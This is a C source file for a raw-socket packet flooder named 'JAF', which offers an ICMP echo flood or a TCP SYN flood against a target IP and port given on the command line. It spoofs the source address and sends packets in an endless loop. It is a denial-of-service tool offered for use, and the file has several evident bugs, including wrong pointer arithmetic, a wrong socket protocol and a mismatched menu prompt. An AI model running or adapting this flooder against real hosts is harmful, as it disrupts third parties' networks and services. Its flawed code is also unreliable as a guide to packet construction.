#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include "jaf.h"

#define PKT_LEN 10000
#define DELAY 8

/*
* JSF, Just Another Flooder
* Copyleft (C) 2010 stoke
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program. If not, see <http://www.gnu.org/licenses/>.
*/


/*
  888888  .d8888b.  8888888888                  888888                   888               d8888                   888    888                           8888888888 888                        888                  
    "88b d88P  Y88b 888                           "88b                   888              d88888                   888    888                           888        888                        888                  
     888 Y88b.      888                            888                   888             d88P888                   888    888                           888        888                        888                  
     888  "Y888b.   8888888                        888 888  888 .d8888b  888888         d88P 888 88888b.   .d88b.  888888 88888b.   .d88b.  888d888     8888888    888  .d88b.   .d88b.   .d88888  .d88b.  888d888 
     888     "Y88b. 888                            888 888  888 88K      888           d88P  888 888 "88b d88""88b 888    888 "88b d8P  Y8b 888P"       888        888 d88""88b d88""88b d88" 888 d8P  Y8b 888P"   
     888       "888 888            888888          888 888  888 "Y8888b. 888          d88P   888 888  888 888  888 888    888  888 88888888 888         888        888 888  888 888  888 888  888 88888888 888     
     88P Y88b  d88P 888                            88P Y88b 888      X88 Y88b.       d8888888888 888  888 Y88..88P Y88b.  888  888 Y8b.     888         888        888 Y88..88P Y88..88P Y88b 888 Y8b.     888     
     888  "Y8888P"  888                            888  "Y88888  88888P'  "Y888     d88P     888 888  888  "Y88P"   "Y888 888  888  "Y8888  888         888        888  "Y88P"   "Y88P"   "Y88888  "Y8888  888     
   .d88P                                         .d88P                                                                                                                                                             
 .d88P"                                        .d88P"                                                                                                                                                              
888P"                                         888P"                                                                                                                                                                

*/



struct icmphdr {
        unsigned char              type;
        unsigned short              code;
        unsigned short             checksum;
        unsigned short             id;
        unsigned short             sequence;
};

	

unsigned short csum(unsigned short *buf, int nwords){ 
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return ~sum;
}

void sin_init(short port, char *addr, struct sockaddr_in *sin) {
	 sin->sin_family = AF_INET;
	 sin->sin_port = htons(port);
	 sin->sin_addr.s_addr = inet_addr(addr);
}


int main(int argc, char **argv) {
	int sd, choose;
	char buf[PKT_LEN];
	struct iphdr *ip = (struct iphdr *) buf;
	struct tcphdr *tcp = (struct tcphdr *) buf + sizeof(struct iphdr);
	struct icmphdr *icmp = (struct icmphdr *) malloc(sizeof(struct icmphdr));
	struct sockaddr_in sin;
	int root = 1, *ptr = &root;
	
	sin_init(atoi(argv[2]), argv[1], &sin);
	memset(buf, 0, PKT_LEN);
	
	ip->ihl = 5; 
    ip->version = 4;
    ip->tos = 16;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    ip->id = htons(50000);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->check = 0;
    ip->saddr = inet_addr(argv[3]);
    ip->daddr = inet_addr(argv[1]);
    
    printf(".:[JAF - Just Another Flooder]:."
		   "[0] - ICMP ECHO Flood\n"
		   "[1] - TCP SYN Flood\n\n");
	
	printf("::> ");
	scanf("%d", &choose);
	
	if (choose == 0) {
		ip->protocol = IPPROTO_ICMP;
		printf("[+] Building the ICMP Packet\n");
		icmp->type = 8;
        icmp->code = 0;
        icmp->checksum = 0;
        icmp->id = 1;
        icmp->sequence = 1;
	}

	else if (choose == 1) {	
		ip->protocol = IPPROTO_TCP;
		printf("[+] Building the TCP packet with SYN flag on\n");
		tcp->source = htons(9090);
		tcp->dest = htons(atoi(argv[2]));
		tcp->seq = htonl(1);
		tcp->ack_seq = 0;
		tcp->doff = 5;
		tcp->syn = 1;
		tcp->ack = 0;
		tcp->window = htons(5000);
		tcp->check = 0;
		tcp->urg_ptr = 0;
	}
	
	else {
		printf("WTF? 1 or 2");
		return -1;
	}
	
	sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (choose == 0) {
		memcpy(buf+sizeof(struct iphdr), icmp, sizeof(struct icmphdr));
		ip->check = csum((unsigned short *) buf, sizeof(struct iphdr) + sizeof(struct icmphdr));
	}
	
	if (choose == 1) {
		ip->check = csum((unsigned short *) buf, sizeof(struct iphdr) + sizeof(struct tcphdr));
	}
	
	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, ptr, sizeof(root)) < 0) {
		printf("[-] ERROR: Are you sure that you are root?\n");
		return -1;
	}
	while (1) {
		if (sendto(sd, buf, ip->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
			printf("[-] Error sending the packet");
			return -1;
		usleep(DELAY);
		}
	}
	return 0;
}
